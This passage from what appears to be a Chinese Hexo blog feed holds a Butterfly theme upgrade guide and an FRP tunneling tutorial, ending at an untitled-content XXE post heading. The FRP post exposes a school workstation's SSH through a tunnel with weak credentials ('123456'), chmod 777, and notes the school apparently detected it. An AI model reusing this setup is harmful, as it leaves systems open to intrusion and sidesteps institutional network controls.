title="安装新版hexo"></a>安装新版hexo</h3><p>在我们存放更新后博客文件的目录下，鼠标右键打开 Git Bush Here，输入npm命令安装Hexo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><img src="/posts/4a2dc63ff98e/image-20240201211338914.png" class="" title="image-20240201211338914"><p>安装完后，我们可以在<code>nodejs\node_global\node_modules</code>目录下找到安装的<code>hexo-cli</code></p><img src="/posts/4a2dc63ff98e/image-20240201211423995.png" class="" title="image-20240201211423995"><p>执行<code>hexo init</code>命令初始化博客</p><p>我们执行经典的hexo三件套来测试当前框架是否可用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>网页显示正常，说明安装的hexo包可用</p><img src="/posts/4a2dc63ff98e/image-20240201212045748.png" class="" title="image-20240201212045748"><h3 id="安装新版butterfly"><a href="#安装新版butterfly" class="headerlink" title="安装新版butterfly"></a>安装新版butterfly</h3><p>进入themes目录，克隆butterfly主题的仓库下的稳定版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>将butterfly主题的<code>_config.yml</code>文件复制到博客根目录，改名为<code>_config.butterfly.yml</code></p><p>在根目录的<code>_config.yml</code>配置文件中将主题切换为butterfly</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>重新执行hexo三件套，验证网站是否切换到butterfly主题</p><img src="/posts/4a2dc63ff98e/image-20240201212827365.png" class="" title="image-20240201212827365"><p>可以看到此时执行hexo指令时会显示当前butterfly版本<code>4.12.0</code></p><p>安装<code>pug</code>和<code>stylus</code>渲染器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><img src="/posts/4a2dc63ff98e/image-20240201214250581.png" class="" title="image-20240201214250581"><div class="note success flat"><p>安装成功！</p></div><h2 id="修改ymal配置文件"><a href="#修改ymal配置文件" class="headerlink" title="修改ymal配置文件"></a>修改ymal配置文件</h2><p>vscode自带的文件对比功能非常直观，所以我们可以利用它来修改更新后的博客配置文件</p><img src="/posts/4a2dc63ff98e/image-20240201233133247.png" class="" title="image-20240201233133247"><p>右键新<code>_config.yml</code>文件，点击<strong>选择已进行比较</strong></p><p>右键原<code>_config.yml</code>文件，点击<strong>与已选项目进行比较</strong></p><img src="/posts/4a2dc63ff98e/image-20240201233358381.png" class="" title="image-20240201233358381"><p>这样我们就能直观的看到原来的配置文件修改了哪些地方，而哪些地方是新版本增加的功能</p><p>同样的，我们还需要用这种方法比较<code>_config.butterfly.yml</code>配置文件</p><h2 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h2><ol><li><p>安装<code>share.js</code>分享功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install social-share.js</span><br></pre></td></tr></table></figure></li><li><p>安装<code>Aplayer</code>音乐插件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br><span class="line">npm install aplayer --save</span><br></pre></td></tr></table></figure></li><li><p>安装图片管理插件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure></li><li><p>安装live2d插件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p> 复制原博客的<code>live2d_models</code>文件夹到新博客的根目录下</p></li><li><p>修改默认的 markdown 渲染引擎來实现 MathJax 的效果</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></li><li><p>安装本地搜索插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-generator-search</span><br></pre></td></tr></table></figure></li><li><p>安装git部署插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>安装字数统计插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure></li></ol><h2 id="复制源文件"><a href="#复制源文件" class="headerlink" title="复制源文件"></a>复制源文件</h2><p>将原博客<code>source</code>目录下的文件复制到新目录的相同位置</p><p>将原博客<code>themes/butterfly/source/img</code>下的图标等图片复制到新目录中</p><p>将原博客<code>themes/butterfly/source/js</code>下的魔改文件复制到新目录中</p><p>将原博客<code>themes/butterfly/source/css</code>下的<code>_custom</code>文件夹复制到新目录中</p><p>修改<code>themes/butterfly/source/css/index.styl</code></p><p>添加下面的代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&#x27;_custom/**/*.css&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="重新魔改"><a href="#重新魔改" class="headerlink" title="重新魔改"></a>重新魔改</h2><h3 id="直达底部按钮"><a href="#直达底部按钮" class="headerlink" title="直达底部按钮"></a>直达底部按钮</h3><p><code>butterfly/layout/includes/rightside.pug</code>文件</p><p>代码末尾添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">button#go-down(type=&quot;button&quot; title=&quot;直达底部&quot; onclick=&quot;btf.scrollToDest(document.body.scrollHeight, 500)&quot;)</span><br><span class="line">  i.fas.fa-arrow-down</span><br></pre></td></tr></table></figure><h3 id="顶部波浪"><a href="#顶部波浪" class="headerlink" title="顶部波浪"></a>顶部波浪</h3><p><code>butterfly/layout/includes/header/index.pug</code>文件</p><p>代码的37行后添加如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">section.main-hero-waves-area.waves-area</span><br><span class="line">  svg.waves-svg(xmlns=&#x27;http://www.w3.org/2000/svg&#x27;, xlink=&#x27;http://www.w3.org/1999/xlink&#x27;, viewBox=&#x27;0 24 150 28&#x27;, preserveAspectRatio=&#x27;none&#x27;, shape-rendering=&#x27;auto&#x27;)</span><br><span class="line">    defs</span><br><span class="line">      path#gentle-wave(d=&#x27;M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z&#x27;)</span><br><span class="line">    g.parallax</span><br><span class="line">        use(href=&#x27;#gentle-wave&#x27;, x=&#x27;48&#x27;, y=&#x27;0&#x27;)</span><br><span class="line">        use(href=&#x27;#gentle-wave&#x27;, x=&#x27;48&#x27;, y=&#x27;3&#x27;)</span><br><span class="line">        use(href=&#x27;#gentle-wave&#x27;, x=&#x27;48&#x27;, y=&#x27;5&#x27;)</span><br><span class="line">        use(href=&#x27;#gentle-wave&#x27;, x=&#x27;48&#x27;, y=&#x27;7&#x27;)</span><br></pre></td></tr></table></figure><img src="/posts/4a2dc63ff98e/image-20240202005847560.png" class="" title="image-20240202005847560"><h3 id="外挂标签"><a href="#外挂标签" class="headerlink" title="外挂标签"></a>外挂标签</h3><h4 id="checkbox"><a href="#checkbox" class="headerlink" title="checkbox"></a>checkbox</h4><p>将原博客<code>themes/butterfly/scripts/tag</code>目录下的<code>checkbox.js</code>文件复制到新目录的相同位置</p><p>将原博客<code>themes/butterfly/source/css/tags</code>目录下的<code>checkbox.styl</code>文件复制到新目录的相同位置</p><div class="tabs" id="语法"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="语法-1">标签语法</button><button type="button" class="tab " data-href="语法-2">配置参数</button><button type="button" class="tab " data-href="语法-3">样式预览</button><button type="button" class="tab " data-href="语法-4">示例源码</button></ul><div class="tab-contents"><div class="tab-item-content active" id="语法-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="语法-2"><ol><li>样式: plus, minus, times</li><li>颜色: red,yellow,green,cyan,blue,gray</li><li>选中状态: checked</li></ol></div><div class="tab-item-content" id="语法-3"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div></div><div class="tab-item-content" id="语法-4"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><h4 id="气泡注释"><a href="#气泡注释" class="headerlink" title="气泡注释"></a>气泡注释</h4><p>将原博客<code>themes/butterfly/scripts/tag</code>目录下的<code>bubble.js</code>文件复制到新目录的相同位置</p><p>将原博客<code>themes/butterfly/source/css/tags</code>目录下的<code>bubble.styl</code>文件复制到新目录的相同位置</p><div class="tabs" id="语法"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="语法-1">标签语法</button><button type="button" class="tab " data-href="语法-2">配置参数</button><button type="button" class="tab " data-href="语法-3">示例源码</button></ul><div class="tab-contents"><div class="tab-item-content active" id="语法-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="语法-2"><p><code>content</code>: 注释词汇<br><code>notation</code>: 悬停显示的注解内容<br><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</p></div><div class="tab-item-content" id="语法-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自注意力机制（Self-Attention Mechanism）是一种在处理&#123;% bubble 序列数据, &quot;由一系列按特定顺序排列的元素组成的数据，如文本、时间序列等。&quot;,&quot;#ec5830&quot; %&#125;时尤为重要的技术。它通过计算序列中每个元素与其他所有元素之间的相关性，来捕捉&#123;% bubble 全局依赖关系, &quot;序列中任意两个元素之间的依赖关系，而不仅限于相邻元素。&quot;,&quot;#1db675&quot; %&#125;。这种机制最早在Transformer模型中引入，并在自然语言处理（NLP）任务中表现出色。具体而言，自注意力机制通过计算&#123;% bubble 查询（Query）、键（Key）和值（Value）, &quot;用于计算注意力权重的三个向量，分别表示输入序列中每个元素的特征。&quot;,&quot;#de4489&quot; %&#125;之间的点积，来生成注意力权重（Attention Weights），并据此对输入序列进行加权求和，从而得到输出表示。这种机制的一个显著优点是可以并行计算，极大地提升了处理长序列的效率。</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><p><strong>示例</strong>如下：</p><p>自注意力机制（Self-Attention Mechanism）是一种在处理<span class="bubble-content">序列数据</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;"> 由一系列按特定顺序排列的元素组成的数据，如文本、时间序列等。</span></span>时尤为重要的技术。它通过计算序列中每个元素与其他所有元素之间的相关性，来捕捉<span class="bubble-content">全局依赖关系</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;"> 序列中任意两个元素之间的依赖关系，而不仅限于相邻元素。</span></span>。这种机制最早在Transformer模型中引入，并在自然语言处理（NLP）任务中表现出色。具体而言，自注意力机制通过计算<span class="bubble-content">查询（Query）、键（Key）和值（Value）</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;"> 用于计算注意力权重的三个向量，分别表示输入序列中每个元素的特征。</span></span>之间的点积，来生成注意力权重（Attention Weights），并据此对输入序列进行加权求和，从而得到输出表示。这种机制的一个显著优点是可以并行计算，极大地提升了处理长序列的效率。</p><h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>将原博客<code>themes/butterfly/layout/includes/page</code>目录下的<code>about.pug</code>文件复制到新目录的相同位置</p><p>修改<code>themes/butterfly/layout</code>目录下的<code>page.pug</code>文件，在合适位置添加如下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">when <span class="string">&#x27;about&#x27;</span></span><br><span class="line">include includes/page/about.pug   </span><br></pre></td></tr></table></figure><h3 id="装备页面"><a href="#装备页面" class="headerlink" title="装备页面"></a>装备页面</h3><p>将原博客<code>themes/butterfly/layout/includes/page</code>目录下的<code>equipment.pug</code>文件复制到新目录的相同位置</p><p>修改<code>themes/butterfly/layout</code>目录下的<code>page.pug</code>文件，在合适位置添加如下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">when <span class="string">&#x27;equipment&#x27;</span></span><br><span class="line">include includes/page/equipment.pug   </span><br></pre></td></tr></table></figure><h3 id="自定义页面宽度"><a href="#自定义页面宽度" class="headerlink" title="自定义页面宽度"></a>自定义页面宽度</h3><p>具体可以参考之前写的下面这篇文章</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://rickliu.com/posts/17fd4e606351/" title="butterfly主题修改单页的背景及宽度" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/2023-8-5-cover.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="butterfly主题修改单页的背景及宽度" />              </div>              <div class="flink-item-name">butterfly主题修改单页的背景及宽度</div>               <div class="flink-item-desc" title="在_config.yml中新增pages_width项">在_config.yml中新增pages_width项</div>            </a>          </div></div></div>]]></content>
      
      
      <categories>
          
          <category> 博客搭建记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次FRP内网穿透搭建</title>
      <link href="/posts/7019357c875a/"/>
      <url>/posts/7019357c875a/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今年计划参加<strong>大学生信息安全大赛作品赛</strong>，为了让评委老师更便捷地体验我的作品，故希望实现前后端分离，将软件的功能实现放在单独的服务端。</p><p>考虑到这次项目涉及的模型环境都较为复制，所以腾讯云/阿里云上出租的CPU云服务器肯定达不到运行要求，而GPU云服务器费用又较贵，从现在租到六月份不太显示</p><p>最后综合考虑后，只能退而求其次，舍弃一部分并发处理的性能，直接将学校的工作站作为服务端，而由于工作站没有公网IP，所以就需要涉及到<strong>内网穿透技术</strong></p><div class="note info flat"><p><strong>内网穿透技术</strong>，也被称为<strong>NAT穿透技术（Network Address Translation穿透）</strong>，是一种允许互联网上的设备访问位于私有网络（例如家庭或办公网络）内部的设备或服务的技术。</p></div><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>FRP（Fast Reverse Proxy）</strong>是github上的一个开源内网穿透项目。当然<strong>开源</strong>也是我选择它的主要原因。</p><p>项目地址：<a href="https://github.com/fatedier/frp?tab=readme-ov-file">https://github.com/fatedier/frp?tab=readme-ov-file</a></p><p>FRP通过设置一个公共网络上的服务器（称为FRP服务器）和在内网设备上运行的客户端（称为FRP客户端）来工作。FRP的工作流程可以分为以下几个步骤：</p><ol><li><strong>配置FRP服务器</strong>: 在公共网络上的服务器上部署FRP服务。这个服务器将监听来自FRP客户端的连接，并将来自互联网的请求转发到正确的内网服务。</li><li><strong>配置FRP客户端</strong>: 在需要进行内网穿透的内网设备上部署FRP客户端。这个客户端将与FRP服务器建立连接，并根据配置将内网服务通过服务器暴露给外网。</li><li><strong>建立隧道</strong>: 当FRP客户端启动后，它会与FRP服务器建立一个隧道连接。这个隧道被用来转发请求和响应。</li><li><strong>请求转发</strong>: 当外网的用户或服务请求特定的服务时，FRP服务器接收到这个请求后，通过建立的隧道将请求转发到FRP客户端，再由客户端转发到内网的目标服务。</li><li><strong>响应返回</strong>: 内网服务处理完请求后，响应会通过相同的隧道返回给FRP服务器，然后由FRP服务器发送回原始请求者。</li></ol><img src="/posts/7019357c875a/2024-1-24-architecture.png" class="" title="architecture"><h2 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h2><p>本次搭建的服务端及客户端环境如下</p><p><strong>服务端</strong>：腾讯云上租的CPU云服务器(ubuntu系统)</p><p><strong>客户端</strong>：学校实验室的工作站(ubuntu系统)</p><p>进入frp的github项目<strong>发行页</strong>，这里我选择的是稍微往前一点的稳定版本<code>0.51.2</code></p><img src="/posts/7019357c875a/image-20240124225855418.png" class="" title="image-20240124225855418"><p>由于我的两个终端上的系统都是linux/X86_64，选择下载对应版本的压缩包<code>amd64</code></p><p>解压后的目录结构如下</p><img src="/posts/7019357c875a/image-20240124215642372.png" class="" title="image-20240124215642372"><p>三个客户端文件以及三个服务端文件，还有个LICENSE</p><p>我们将对应文件上传到对应终端即可</p><p>这里服务端直接使用<code>wget</code>命令下载到并解压更加方便</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.51.2/frp_0.51.2_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.51.2_linux_amd64.tar.gz</span><br><span class="line">cd frp_0.51.2_linux_amd64</span><br></pre></td></tr></table></figure><p>但是由于我的腾讯云服务器设在内地，也没搭VPN，所以通过使用<strong>xftp</strong>连接后从本地上传</p><img src="/posts/7019357c875a/image-20240124221447788.png" class="" title="image-20240124221447788"><p>记得传好后执行<code>chmod</code>指令给上次的frp文件夹提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 frp_0.51.2_linux_amd64</span><br></pre></td></tr></table></figure><h2 id="frps配置"><a href="#frps配置" class="headerlink" title="frps配置"></a>frps配置</h2><p>查看<code>frps.ini</code>服务端配置文件</p><p>这里我们主要设置一些与客户端连接的端口以及口令</p><img src="/posts/7019357c875a/image-20240124223103998.png" class="" title="image-20240124223103998"><p>初始情况下只设置了与客户端连接的端口7000</p><p>当然，frp还提供了仪表盘功能，我们只需在配置文件中设置仪表盘的端口、用户名和密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7001</span></span><br><span class="line"><span class="attr">dashboard_user</span> = root</span><br><span class="line"><span class="attr">dashboard_pwd</span> = <span class="number">123456</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">123456</span></span><br></pre></td></tr></table></figure><ul><li><strong>bind_port</strong>：客户端和服务端连接的端口</li><li><strong>dashboard_port</strong>：服务端仪表盘的端口</li><li><strong>dashboard_user</strong>：仪表盘用户名</li><li><strong>dashboard_pwd</strong>：仪表盘密码</li><li><strong>token</strong>：用于客户端和服务端连接的口令，两个终端上需保持一致</li></ul><h2 id="启动frps"><a href="#启动frps" class="headerlink" title="启动frps"></a>启动frps</h2><p>我们可以执行以下指令在服务端开启frps服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><img src="/posts/7019357c875a/image-20240124231035256.png" class="" title="image-20240124231035256"><p>此时我们应该能在<code>公网ip:仪表盘端口</code>上访问frp服务端的仪表盘</p><img src="/posts/7019357c875a/image-20240124231307325.png" class="" title="image-20240124231307325"><h2 id="frpc配置"><a href="#frpc配置" class="headerlink" title="frpc配置"></a>frpc配置</h2><p>同样，客户端则是配置<code>frpc.ini</code>文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ocr]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span>= <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">6789</span></span><br><span class="line"><span class="attr">remote_port</span>= <span class="number">6001</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure><ul><li><strong>server_addr</strong>：服务端的ip。</li><li><strong>server_port</strong>：服务端配置的连接端口。</li><li><strong>token</strong>：服务端配置的token。</li><li><strong>[xxx]</strong>：表示一个规则的名称，可以自己定义。</li><li><strong>type</strong>：表示转发的协议类型，有tcp、udp等选项可以选择。</li><li><strong>local_ip</strong>：客户端的本地ip。</li><li><strong>local_port</strong>：客户端的本地端口号。</li><li><strong>remote_port</strong>：服务端开放的端口号。当我们通过访问<code>server_addr : remote_port</code>就能转发到<code>客户端（frpc）的服务 local_ip : local_port</code> 上。</li></ul><h2 id="启动frpc"><a href="#启动frpc" class="headerlink" title="启动frpc"></a>启动frpc</h2><p>我们可以执行以下指令在客户端开启frpc服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>我们可以用ssh连上刚刚配置的ip和端口号，测试下是否搭建成功</p><img src="/posts/7019357c875a/image-20240125013200847.png" class="" title="image-20240125013200847"><h2 id="持久化frp服务"><a href="#持久化frp服务" class="headerlink" title="持久化frp服务"></a>持久化frp服务</h2><h3 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h3><p>我们可以在启动frps和启动frpc的指令后分别加上<code>&amp;</code>，让它们在后台运行，避免终端进程被我们不小心中断</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini &amp;</span><br><span class="line">./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure><h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><p>腾讯云服务器上的客户端进程运行之后就不需要去管了</p><p>我们主要是得<strong>将客户端工作站上的frpc进程转为开机自启服务</strong>，避免关机重启后frpc还需要我们再手动去启动</p><p>使用<code>apt</code>命令安装<code>systemd</code>，用于控制开机自启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install systemd</span><br></pre></td></tr></table></figure><p>在<code>/etc/systemd/system</code>路径下新建<code>frpc.service</code>文件</p><p>在其中写入如下规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description = frp client</span><br><span class="line">After = network.target syslog.target</span><br><span class="line">Wants = network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User = root</span><br><span class="line">Type = simple</span><br><span class="line">Restart = on-failure</span><br><span class="line">RestartSec = 5s</span><br><span class="line">ExecStart = /path/to/frpc -c /path/to/frpc.ini</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure><p>其中<strong>ExecStart</strong>的值为启动frpc的命令，<strong>文件路径需要使用绝对路径</strong></p><p>执行如下指令启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置 frpc 开机自启。</span></span><br><span class="line">systemctl enable frpc.service</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 frpc 服务</span></span><br><span class="line">systemctl start frpc.service</span><br></pre></td></tr></table></figure><p>我们可以执行如下指令查看frpc服务的状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status frpc.service</span><br></pre></td></tr></table></figure><h2 id="悲报"><a href="#悲报" class="headerlink" title="悲报"></a>悲报</h2><div class="note danger flat"><p>很不幸，本人在学校工作站上搭建的内网穿透服务只存活了两周左右的时间，可能是frp的通信特征被学校网络中心侦测到了。以后测试软件只能用todesk远控哩😭</p></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XML&amp;XXE漏洞</title>
      <link href="/posts/f41e16b8b181/"/>
      <url>/posts/f41e16b8b181/</url>
      
